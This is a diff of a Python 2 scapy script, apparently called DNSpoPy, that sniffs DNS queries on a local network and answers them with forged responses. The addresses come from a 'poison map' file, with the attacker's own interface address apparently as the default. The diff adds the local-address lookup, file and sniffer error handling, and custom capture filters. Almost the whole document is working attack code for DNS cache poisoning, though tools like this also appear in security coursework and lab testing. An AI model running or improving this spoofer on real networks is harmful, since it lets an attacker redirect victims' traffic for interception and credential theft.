@@ -12,12 +12,10 @@ hostnames_specified = False
 poison_map = {}
 def poison_cache(pkt):
 	global hostnames_specified
+	global lo_addr
 	if IP in pkt:
 		ip_src = pkt[IP].src
 		ip_dst = pkt[IP].dst
-		if pkt.haslayer(DNSRR):
-			print "Response: " + str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ":" + str(pkt.getlayer(DNSRR).show2()) + ")"
-		
 		if pkt.haslayer(DNSQR) and pkt.getlayer(DNS).qr == 0 and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0 and pkt[DNS].qd.qtype in {1, 28}:
 			print str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"
 			pkt[UDP].chksum = None
@@ -37,37 +35,47 @@ def poison_cache(pkt):
 
 def main():
 	global hostnames_specified
+	global lo_addr
 	interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
-	
+	lo_addr = netifaces.ifaddresses(str(interface))[netifaces.AF_INET][0]['addr']
 	try:
 		opt, exp = getopt.getopt(sys.argv[1:], "i:h:", ["interface", "hostname"])
 	
 	except getopt.GetoptError as err:
 		print "DNSpoPy: Usage Error:",
-		print str(err)  # will print something like "option -a not recognized"
+		print str(err)
 		sys.exit(2)
 	
 	for o, a in opt:
 		if o in ("-i", "--interface"):
 			interface = a
-			print "interface: " + a
+#			print "Listening on interface: " + a
 		elif o in ("-h", "--hostname"):
 			hostnames_specified = True
-			print "hostname: " + a
+#			print "Poison file: " + a
 			host_file = a
 		else:
 			assert False, "Option not recognized"
 	if hostnames_specified:
-		print "Reading Cache poisoning data from file " + host_file + " ..."
-		with open(host_file, "r") as hostfile:
-			for each_entry in hostfile:
-				dns_map = each_entry.split()
-				poison_map[dns_map[1] + "."] = dns_map[0]
-	
-	print "Poison Map: " + str(poison_map)
-	
-	sniff(iface = interface, filter = "port 53", prn = poison_cache, store = 0)
-
+		print "Trying to read cache poisoning data from file " + host_file + " ..."
+		try:
+			with open(host_file, "r") as hostfile:
+				for each_entry in hostfile:
+					dns_map = each_entry.split()
+					poison_map[dns_map[1] + "."] = dns_map[0]
+			print "Poison Map: " + str(poison_map)
+		except IOError:
+			print "DNSpoPy: No such file found: " + host_file
+			return
+	fexp = 'port 53'
+	if len(exp) > 0:
+		fexp += ' and ' + ' '.join(exp)
+	print "Sniffing on packets on interface: "+ str(interface)
+	try:
+		sniff(iface = str(interface), filter = fexp, prn = poison_cache, store = 0)
+	except:
+		print "DNSpoPy: Invalid arguments to sniffer module. Are you root ?"
+		return
 if __name__ == "__main__":
 	main()
 
